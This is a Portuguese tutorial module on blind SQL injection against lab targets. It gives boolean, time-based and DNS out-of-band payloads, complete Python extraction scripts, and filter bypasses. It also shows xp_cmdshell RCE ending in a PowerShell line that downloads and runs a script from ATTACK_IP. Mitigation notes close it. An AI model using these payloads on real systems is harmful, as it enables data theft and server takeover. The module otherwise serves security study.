---
title: "Blind & Advanced SQLi"
---

# SQL Injection Blind e Avançado

## A Falha: Inferência de Dados por Comportamento da Aplicação

Blind SQL Injection existe porque a aplicação continua executando as queries injetadas mesmo quando suprime o resultado visível. O erro de design não está no output — está no fato de que o input ainda vai parar dentro da query SQL sem separação estrutural entre código e dados. A supressão de erros é uma medida cosmética: ela esconde a evidência da vulnerabilidade, mas não elimina a vulnerabilidade em si.

O que o desenvolvedor frequentemente faz ao "hardening" básico é remover mensagens de erro de SQL da resposta HTTP. Isso parece seguro, mas a aplicação ainda executa a query injetada e ainda varia seu comportamento com base no resultado. Se o banco retorna linhas, a resposta da aplicação muda de um jeito; se retorna zero linhas, muda de outro. Essa diferença de comportamento — por menor que seja — é suficiente para um atacante extrair dados bit a bit.

A suposição equivocada é que "sem output não há informação". Na realidade, o comportamento binário da aplicação (encontrou/não encontrou, rápido/lento, sucesso/erro) funciona como um canal de comunicação de um bit por request. Com esse canal de um bit, é possível extrair qualquer valor do banco: basta fazer perguntas cujas respostas sejam sim/não — e repetir para cada bit de cada caractere de cada campo.

A consequência antes de ver a exploração: blind SQLi é igualmente devastadora que a variante in-band. A diferença é que leva mais requisições — não mais segurança. Com os algoritmos corretos de bisseção ou operações bit a bit, uma string de 20 caracteres pode ser extraída em menos de 200 requisições HTTP. Scripts automatizados fazem esse processo em segundos.

---

## Causa Raiz

O código vulnerável é idêntico ao da SQLi clássica — concatenação de input na query sem parametrização. O que diferencia blind SQLi é apenas o contexto de resposta:

```python
# VULNERÁVEL — mesmo padrão: input concatenado sem separação
username = request.args.get('u')
query = f"SELECT * FROM users WHERE username = '{username}'"
result = db.execute(query).fetchone()

# A aplicação só retorna True/False — mas a query ainda é injetável!
if result:
    return {"status": "taken"}
else:
    return {"status": "available"}
```

O que está faltando é o mesmo: queries parametrizadas. A supressão do output não resolve nada porque o problema está na construção da query, não na exibição do resultado. Um desenvolvedor que implementa `try/except` sem mostrar erros e conclui que "está seguro" cometeu esse erro — confundiu ocultação de sintoma com correção de causa.

---

## Como o Ataque Funciona

### Boolean-Based Blind SQLi

A ideia: fazer uma pergunta ao banco que resulte em `true` ou `false`, e observar como a aplicação se comporta diferente.

```
Pergunta verdadeira → App retorna "tomado" / mostra resultado
Pergunta falsa     → App retorna "disponível" / sem resultado
```

**Exemplo prático (endpoint /api/check-username):**

```
# true → status: "taken"
maria' AND 1=1-- -

# false → status: "available"
maria' AND 1=0-- -
```

Isso confirma injeção boolean. Agora qualquer query SQL pode ser inserida como condição:

```sql
-- Verificar se senha começa com 'a'
maria' AND SUBSTRING(password,1,1)='a'-- -

-- Verificar comprimento da senha
maria' AND LEN(password)=8-- -    -- MSSQL
maria' AND LENGTH(password)=8-- - -- MySQL/PostgreSQL

-- Verificar valor ASCII do primeiro char
maria' AND ASCII(SUBSTRING(password,1,1))=109-- - -- 'm' = 109
```

### Time-Based Blind SQLi

Quando não há diferença observável no output (sincronismo), mas a aplicação espera a query completar, podemos usar delay:

```sql
-- MSSQL
';WAITFOR DELAY '0:0:5'--

-- MySQL
' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE '%')--

-- PostgreSQL  
'; SELECT pg_sleep(5)--

-- Oracle
' AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',5)--
```

**Uso como oracle:**
```sql
-- Se q é true → espera 5 segundos
-- Se q é false → responde imediatamente
SELECT ... WHERE ... = 'Mozilla Firefox...'; IF (q) WAITFOR DELAY '0:0:5'--
```

**Script Python para oracle time-based (MSSQL):**
```python
#!/usr/bin/env python3
import requests
import time

DELAY = 1  # segundos de espera

def oracle(q):
    start = time.time()
    r = requests.get(
        "http://SERVER_IP:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

# Verificar que funciona
assert oracle("1=1")
assert not oracle("1=0")
```

### Out-of-Band (DNS Exfiltration)

Quando nem boolean nem time funcionam (resposta síncrona, sem diferença), pode-se forçar o servidor a fazer uma requisição DNS com os dados codificados:

```sql
-- MSSQL via xp_dirtree
DECLARE @T VARCHAR(1024);
SELECT @T=(SELECT 1234);
EXEC('master..xp_dirtree "\\"+@T+".YOUR.DOMAIN\x"');

-- MSSQL via fn_trace_gettable  
DECLARE @T VARCHAR(1024);
SELECT @T=(SELECT 1234);
SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);
```

---

## Identificação e Discovery

### Confirmando Boolean Blind

Enviar dois payloads com resultados opostos e confirmar que o comportamento da aplicação muda:

```sql
-- Deve retornar resultado positivo (true)
maria' AND 1=1-- -

-- Deve retornar resultado negativo (false)
maria' AND 1=0-- -
```

Se os dois retornos são idênticos, a aplicação não vaza informação via boolean. Partir para time-based.

### Confirmando Time-Based

```bash
# Enviar payload de delay e medir tempo de resposta
time curl "http://alvo.htb/" \
  -H "User-Agent: ';WAITFOR DELAY '0:0:5'--"

# Se demorar ~5s = vulnerável
# Enviar sem delay para confirmar baseline
time curl "http://alvo.htb/" \
  -H "User-Agent: Mozilla/5.0"
```

### Injeção em Headers HTTP

Headers customizados frequentemente são inseridos no banco (logging, analytics):

```
User-Agent: Mozilla/5.0 ...    → armazenado em tabela de logs
X-Forwarded-For: 1.2.3.4      → armazenado em tabela de logs
Referer: https://...           → armazenado em tabela de logs
Cookie: session=abc            → pode ser consultado
```

**Teste de injeção no User-Agent:**
```
User-Agent: ';WAITFOR DELAY '0:0:10'--

# Verificar: resposta demorou 10 segundos? → vulnerável
# Confirmar: enviar sem delay → resposta rápida
```

---

## Exploitation

### Algoritmos de Extração de Dados

Extrair um caractere por vez. Sem otimização: até ~95 requests por caractere (testando ASCII 32-127). Com otimização: 7 requests por caractere.

**Algoritmo de Bisseção (Binary Search):**

```python
def dump_char(query_for_char):
    """
    query_for_char: SQL expression que retorna 1 caractere
    Ex: "ASCII(SUBSTRING(password,1,1))"
    """
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        # Pergunta: valor é <= mid?
        if oracle(f"({query_for_char}) <= {mid}"):
            high = mid
        else:
            low = mid + 1
    return chr(low)

# Uso:
char1 = dump_char("ASCII(SUBSTRING(password,1,1))")
```

**Algoritmo SQL-Anding (bit-a-bit):**

Em vez de busca binária, testa cada bit individualmente. 7 requests por caractere (7 bits = 0-127).

```python
def dump_number(sql_expr):
    """Extrai um número < 256 via bitwise AND"""
    value = 0
    for bit in range(7):  # bits 0-6 (valores 1,2,4,8,16,32,64)
        if oracle(f"({sql_expr})&{2**bit}>0"):
            value |= 2**bit
    return value

def dump_string(sql_expr, length):
    """Extrai uma string de comprimento conhecido"""
    result = ""
    for i in range(1, length + 1):
        char_code = dump_number(f"ASCII(SUBSTRING(({sql_expr}),{i},1))")
        result += chr(char_code)
    return result
```

**SQL-Anding em PostgreSQL/MySQL:**
```python
# Cada bit pode ser testado em paralelo (independentes entre si)
import concurrent.futures

def dump_number_parallel(sql_expr):
    value = 0
    def test_bit(bit):
        return bit, oracle(f"({sql_expr})&{2**bit}>0")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=7) as ex:
        futures = [ex.submit(test_bit, b) for b in range(7)]
        for f in concurrent.futures.as_completed(futures):
            bit, is_set = f.result()
            if is_set:
                value |= 2**bit
    return value
```

**Comparação de performance (extraindo string de 20 chars):**

| Método | Requests por char | Total (20 chars) |
|--------|------------------|------------------|
| Linear (32-127) | ~48 médio | ~960 |
| Bisseção | 7 | 140 |
| SQL-Anding | 7 | 140 |
| SQL-Anding paralelo | 7 (simultâneos) | ~20 rounds |

### Enumeração Completa via Blind - MSSQL

```python
#!/usr/bin/env python3
"""
Exemplo completo de extração via time-based blind MSSQL
Target: User-Agent header injection no banco 'digcraft'
"""
import requests, time

DELAY = 1

def oracle(q):
    start = time.time()
    requests.get(
        "http://SERVER:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

def dump_number(q):
    n = 0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            n |= 2**p
    return n

def dump_string(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

# 1. Tamanho do nome do banco
db_name_length = dump_number("LEN(DB_NAME())")
print(f"DB name length: {db_name_length}")

# 2. Nome do banco
db_name = dump_string("DB_NAME()", db_name_length)
print(f"DB name: {db_name}")

# 3. Número de tabelas
num_tables = dump_number(f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{db_name}'")
print(f"Tables: {num_tables}")

# 4. Nomes das tabelas
for i in range(num_tables):
    tbl_len = dump_number(
        f"select LEN(table_name) from information_schema.tables "
        f"where table_catalog='{db_name}' order by table_name offset {i} rows fetch next 1 rows only"
    )
    tbl_name = dump_string(
        f"select table_name from information_schema.tables "
        f"where table_catalog='{db_name}' order by table_name offset {i} rows fetch next 1 rows only",
        tbl_len
    )
    print(f"  Table {i}: {tbl_name}")
```

---

## Payloads e Exemplos

### Boolean-Based Payloads

```sql
-- Teste básico de oracle (MySQL)
' AND 1=1-- -        -- true
' AND 1=0-- -        -- false

-- Extrair comprimento (MySQL)
' AND LENGTH(database())=8-- -
' AND LENGTH((SELECT password FROM users WHERE username='admin'))>10-- -

-- Extrair caractere por ASCII (MySQL)
' AND ASCII(SUBSTRING(database(),1,1))=100-- -

-- Extrair caractere por BETWEEN (MySQL)  
' AND ASCII(SUBSTRING(database(),1,1)) BETWEEN 97 AND 122-- -

-- Oracle para nome do banco (MSSQL)
maria' AND (SELECT LEN(DB_NAME()))=8-- -
maria' AND ASCII(SUBSTRING(DB_NAME(),1,1)) BETWEEN 60 AND 100-- -

-- Verificar existência de tabela
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')=1-- -

-- Extrair dados da tabela users
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=109-- -
```

### Time-Based Payloads por DBMS

| DBMS | Payload |
|------|---------|
| MSSQL | `';WAITFOR DELAY '0:0:5'--` |
| MySQL | `' AND (SELECT SLEEP(5))--` |
| MySQL alternativo | `' AND SLEEP(5)--` |
| PostgreSQL | `'; SELECT pg_sleep(5)--` |
| Oracle | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--` |

**Time-based com condição:**
```sql
-- MSSQL: IF verdadeiro espera 5s, senão imediato
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '0:0:5'--

-- MySQL: condição via CASE
' AND (SELECT CASE WHEN (username='admin') THEN SLEEP(5) ELSE 0 END FROM users LIMIT 1)--
```

### Out-of-Band DNS Exfiltration - MSSQL

```sql
-- Payload simples (test)
DECLARE @T VARCHAR(1024);
SELECT @T=(SELECT 1234);
EXEC('master..xp_dirtree "\\"+@T+".YOUR.DOMAIN\x"');

-- Exfiltrar hash de senha (com encode e split em chunks de 63 chars)
DECLARE @T VARCHAR(MAX);
DECLARE @A VARCHAR(63);
DECLARE @B VARCHAR(63);
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1)
FROM users WHERE username='admin';
SELECT @A=SUBSTRING(@T,3,63);
SELECT @B=SUBSTRING(@T,3+63,63);
SELECT * FROM fn_trace_gettable('\\'+@A+'.'+@B+'.YOUR.DOMAIN\x.trc',DEFAULT);
```

**Funções MSSQL para OOB (requerem diferentes permissões):**

| Função | Query |
|--------|-------|
| `master..xp_dirtree` | `EXEC('master..xp_dirtree "\\"+@T+".DOMAIN\x"')` |
| `master..xp_fileexist` | `EXEC('master..xp_fileexist "\\"+@T+".DOMAIN\\x"')` |
| `master..xp_subdirs` | `EXEC('master..xp_subdirs "\\"+@T+".DOMAIN\x"')` |
| `sys.dm_os_file_exists` | `SELECT FROM sys.dm_os_file_exists('\\'+@T+'.DOMAIN\x')` |
| `fn_trace_gettable` | `SELECT * FROM fn_trace_gettable('\\'+@T+'.DOMAIN\x.trc',DEFAULT)` |
| `fn_get_audit_file` | `SELECT * FROM fn_get_audit_file('\\'+@T+'.DOMAIN\',DEFAULT,DEFAULT)` |

**Ferramentas para receber OOB:**
```bash
# Interactsh (open source, web UI em https://app.interactsh.com)
./interactsh-client   # CLI, mostra DNS recebidos em tempo real

# Burp Collaborator (Burp Professional)
# Burp > Burp Collaborator Client > Copy to clipboard
```

### Remote Code Execution via MSSQL

Se correndo como `sa` (sysadmin), xp_cmdshell permite RCE:

```sql
-- Verificar se é sysadmin
IS_SRVROLEMEMBER('sysadmin');
-- Retorna 1 se sim, 0 se não

-- Payload para verificar (no contexto da app)
maria' AND IS_SRVROLEMEMBER('sysadmin')=1-- -
-- status: "taken" = somos sysadmin

-- Habilitar advanced options
EXEC sp_configure 'Show Advanced Options', '1';
RECONFIGURE;

-- Injeção para habilitar advanced options
';exec sp_configure 'show advanced options','1';reconfigure;--

-- Habilitar xp_cmdshell
EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;

-- Payload de injeção
';exec sp_configure 'xp_cmdshell','1';reconfigure;--

-- Verificar com ping
EXEC xp_cmdshell 'ping /n 4 192.168.43.164';

-- Payload de injeção
';exec xp_cmdshell 'ping /n 4 192.168.43.164';--

-- Reverse shell via PowerShell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACK_IP/shell.ps1\")"';
```

---

## Bypass de Proteções

### Comparative Precomputation (PostgreSQL)

Técnica para dump 1 char por request via blind injection:

```sql
-- Em vez de comparar ASCII byte a byte, usar ID == ASCII do char
-- O user com id=ASCII(primeiro_char_da_senha) aparece nos resultados
' AND id=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='maria')--

-- Com bypass de filtro (espaços = /**/, quotes = $$)
'/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,1,1))/**/FROM/**/users/**/WHERE/**/username=$$maria$$)--
```

### Bypass de Filtros em PostgreSQL

O BlueBird app /find-user tem filtros de `'` e espaços:

```sql
-- Filtro: bloqueia ' e espaços
-- Bypass de espaços: usar /**/ como separador
SELECT/**/username/**/FROM/**/users

-- Bypass de quotes: PostgreSQL aceita $$ para delimitar strings
WHERE/**/username=$$admin$$

-- Bypass de quote simples para UNION
'/**/UNION/**/SELECT/**/$1$$,$$2$$,$$3$$,$$4$$,$$5$$,$$6$$--

-- Combinar ambos (sem espaços, sem quotes)
'/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,1,1))/**/FROM/**/users/**/WHERE/**/username=$$itsmaria$$)--
```

### Bypass do /forgot (Email RegEx)

```
# Filtro regex: ^.*@[A-Za-z]*\.[A-Za-z]*$
# Só aceita formato email

# Payload que passa no regex E injeta SQL
' or 1=1--@bluebird.htb
# Formata como: CHARS@CHARS.CHARS → passa!
# Query resultante: WHERE email = '' or 1=1--@bluebird.htb'
```

### X-Forwarded-For para Error Disclosure

```http
# A app verifica X-Forwarded-For para determinar IP
# Se 127.0.0.1 → mostra stack trace
# Senão → "500 Internal Server Error" genérico

POST /forgot HTTP/1.1
Host: bluebird.htb:8080
X-Forwarded-For: 127.0.0.1

email=' or 1=1--@bluebird.htb
```

### Error-Based PostgreSQL (CAST)

Forçar erro ao converter STRING para INT revela o valor:

```sql
-- Vazar versão do banco
' and 1=CAST((SELECT VERSION()) AS INT)@bluebird.htb
-- Erro: "invalid input syntax for type integer: PostgreSQL 15.2..."

-- Vazar todos os nomes de tabelas
' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)@b.htb

-- Dump de tabela inteira via XML (stacked queries)
';SELECT CAST(CAST(QUERY_TO_XML('SELECT * FROM posts LIMIT 2',TRUE,TRUE,'') AS TEXT) AS INT)--@b.htb
```

---

## Ferramentas

### Script Python Completo - Boolean-Based Oracle

```python
#!/usr/bin/env python3
"""Oracle genérico para boolean-based SQLi via endpoint de username check"""
import requests

TARGET = "http://TARGET_IP/api/check-username"

def oracle(q):
    """Retorna True se query q é verdadeira (status: taken)"""
    r = requests.get(TARGET, params={"u": f"maria' AND ({q})-- -"})
    return r.json().get("status") == "taken"

def dump_string_bisect(sql_expr, max_len=50):
    """Extrai string usando bisseção para cada caractere"""
    # Primeiro descobrir comprimento
    length = 0
    for i in range(1, max_len):
        if oracle(f"LENGTH(({sql_expr}))={i}"):
            length = i
            break
    
    result = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(f"ASCII(SUBSTRING(({sql_expr}),{pos},1)) <= {mid}"):
                hi = mid
            else:
                lo = mid + 1
        result += chr(lo)
        print(f"  [{pos}/{length}] {result}", end='\r')
    print()
    return result

# Enumerar
db = dump_string_bisect("database()")
print(f"Database: {db}")

tables_query = f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}'"
tables = dump_string_bisect(tables_query)
print(f"Tables: {tables}")
```

---

## Detecção e Mitigação

### Sinais de Blind SQLi em Logs

Blind SQLi deixa padrões característicos nos logs: requests repetidos com variações pequenas e sistemáticas em um único parâmetro revelam o padrão de bisseção da extração bit a bit; User-Agent ou outros headers com fragmentos de payload SQL indicam tentativas além do parâmetro principal. Requisições com timing anômalo — múltiplos requests com delay consistente de ~N segundos — são assinatura de time-based blind, enquanto volume alto de requisições para um mesmo endpoint com variação apenas em um parâmetro é o sinal de fundo de qualquer extração automatizada.

### Mitigação

O mesmo remédio da SQLi clássica: prepared statements. Suprimir mensagens de erro é uma medida defensiva útil para não facilitar a enumeração de erros, mas não elimina a vulnerabilidade. A raiz está na construção da query — sem parametrização, qualquer mecanismo de ocultação de output pode ser contornado com técnicas blind.

Para detecção em tempo real, considerar alertas para: alto volume de requisições ao mesmo endpoint com variação de um único parâmetro, e requisições cujo tempo de resposta excede significativamente a baseline esperada para aquela rota.

---

## Módulos Relacionados

As técnicas blind descritas aqui pressupõem familiaridade com os fundamentos e UNION-based SQLi cobertos em [`01_sqli_fundamentos.md`](01_sqli_fundamentos.md). O processo manual de extração bit a bit pode ser automatizado pelo SQLMap — ver [`03_sqlmap.md`](03_sqlmap.md). Quando os payloads blind são bloqueados por filtros ou WAFs, as técnicas de obfuscação aplicáveis estão em [`05_sqli_waf_bypass.md`](05_sqli_waf_bypass.md).
